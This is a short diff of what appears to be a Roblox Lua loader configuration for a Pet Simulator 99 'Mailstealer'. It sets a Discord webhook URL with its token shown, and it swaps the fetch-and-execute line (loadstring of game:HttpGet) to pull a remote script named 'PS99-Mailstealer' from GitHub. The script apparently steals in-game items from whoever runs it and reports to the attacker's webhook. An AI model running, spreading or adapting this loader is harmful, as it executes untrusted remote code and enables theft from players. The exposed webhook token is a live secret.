@@ -3,4 +3,4 @@ Webhook = "https://discord.com/api/webhooks/1214220375995719690/XDJvWDbE1mSHUryH
 selectedLoadingScreen = "2"
 LoadingScreen = true
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
